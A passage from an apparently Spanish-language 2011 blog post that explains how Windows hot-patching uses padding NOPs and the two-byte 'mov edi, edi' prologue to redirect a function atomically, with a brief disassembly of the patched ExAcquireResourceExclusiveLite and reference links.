+<p>Ahora imaginemos que tenemos la posibilidad de escribir los 5 bytes con una única operación utilizando &#8220;lock  cmpxchg8b&#8221; o algo similar. ¿Estaría el problema resuelto? La respuesta es no. Veámoslo desde otro punto de vista.  Hay un hilo (llamémosle &#8220;A&#8221;) que se esta ejecutando e invoca a la función &#8220;ExAcquireResourceExclusiveLite&#8221;. Justo  despues de ejecutar la primera instrucción de dicha función (&#8220;mov edi, edi&#8221;), el SO pone dicho hilo a WAITING  y  nuestro hilo de actualización toma el procesador escribiendo los 5 primeros bytes de la función con el &#8220;far jmp&#8221;.  Cuando el hilo &#8220;A&#8221; resuma su ejecución y quiera ejecutar el &#8220;push ebp&#8221; que había antes, ahora no se encontrara allí  el opcode adecuado, en lugar de eso estará &#8220;en mitad&#8221; del &#8220;far jmp&#8221; con el que hemos parcheado la función y el resultado posiblemente será un pete con &#8220;invalid instruction&#8221;.</p>
+<p>¿cuantas herramientas puede haber que no tengan en cuenta estos problemas a la hora de hookear? No fallarán casi  nunca, pero cuando fallen ya me imagino al desarrollador de turno flipando en colores tratando de imaginarse que  coño ha pasado y leyéndose un manual rápido de windbg para estudiar el dump xD</p>
+<p>¿Como decidieron resolver esto en Windows? La respuesta esta ahí delante, no tenemos más que fijarnos un poco más en   los bytes inmediatamente anteriores a la función &#8220;ExAcquireResourceExclusiveLite&#8221; y en el prologo de la misma.</p>
+<p>Los bytes anteriores a la función son 5 NOPs. Lo primero que vemos en el prologo es otro NOP, esta vez de 2 bytes ya  que el &#8220;mov edi, edi&#8221; no es más que otra manera de escribir un NOP. ¿Para que tanto NOP? Para resolver los problemas  de sincronía en la actualización. En lugar de escribir el &#8220;far jmp&#8221; directamente sobre el prologo de la función,  saben que inmediatamente antes la función van a tener al menos 5 NOPs. Lo saben porque es una opción de los  compiladores de Microsoft (lo cual no quiere decir que otros compiladores también lo permitan). Así que al  actualizar la funcion, escriben los 5 bytes del &#8220;far jmp&#8221; sobre-escribiendo la ristra de NOPs. Aunque tarden un año  en escribir estos 5 bytes con el &#8220;far jmp&#8221; no pasa nada, el resto de hilos siguen ejecutando la función desde el  &#8220;mov edi, edi&#8221; y no se enteran de nada. Finalmente una vez escrito el &#8220;far jmp&#8221;, parchean el &#8220;mov edi, edi&#8221; del  prologo sustituyéndolo por un &#8220;short jmp&#8221; para el que son necesarios 2 bytes exactamente igual que para el &#8220;mov edi, edi&#8221;. Se puede realizar por tanto con una única operación y sin dejar ninguna instrucción &#8220;a medias&#8221; en ninguno de los hilos que pudieran estar en ejecución. Dicho &#8220;short jmp&#8221; saltará 5 bytes hacía atrás, justo al &#8220;far jmp&#8221; que se ha escrito  anteriormente. Pan, problema resuelto, de manera sencilla a la par que elegante y sin que ningún hilo se haya enterado de nada. Una vez hecho el patch quedaría  algo similar a lo siguiente:</p>
+<div class="dean_ch">
+<p>.text:0040339F E9 XX XX XX XX&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">jmp</span> &nbsp; &nbsp; XXXXXXXX <span class="co1">; far jmp a la dirección de la nueva función</span></p>
+<p>ExAcquireResourceExclusiveLite:</p>
+<p>.text:004033A4 EB FB &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="kw1">jmp</span> &nbsp; &nbsp; 0040339F <span class="co1">; salto hacia atras, justo al far jmp anteior</span><br />
+.text:004033A6 <span class="nu0">55</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">ebp</span><br />
+.text:004033A7 8B EC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="kw1">mov</span> &nbsp; &nbsp; <span class="kw3">ebp</span>, <span class="kw3">esp</span><br />
+.text:004033A9 <span class="nu0">83</span> EC 0C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">sub</span> &nbsp; &nbsp; <span class="kw3">esp</span>, <span class="re0">0Ch</span><br />
+.text:004033AC <span class="nu0">53</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">ebx</span><br />
+.text:004033AD <span class="nu0">56</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">esi</span><br />
+.text:004033AE <span class="nu0">57</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">edi</span></p>
+<p>&nbsp;</p></div>
+<p>Lo dicho, nada nuevo pero estoy seguro que mucha gente no lo conocía <img src="http://blog.48bits.com/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" />  Por último un par de referencias:</p>
+<p>http://msdn.microsoft.com/en-us/library/ms173524(v=vs.80).aspx</p>
+<p>http://software.intel.com/sites/products/documentation/hpc/composerxe/en-us/cpp/lin/copts/common_options/option_hotp</p>
+<p>atch.htm</p>
+Entry date: Mon, 14 Mar 2011 16:05:07 +0000
+Entry date_parsed: time.struct_time(tm_year=2011, tm_mon=3, tm_mday=14, tm_hour=16, tm_min=5, tm_sec=7, tm_wday=0, tm_yday=73, tm_isdst=0)
+Epoch Seconds:  1300115107.0
+Entry id: http://blog.48bits.com/?p=1799
+
+- - - - - - - - - -
+
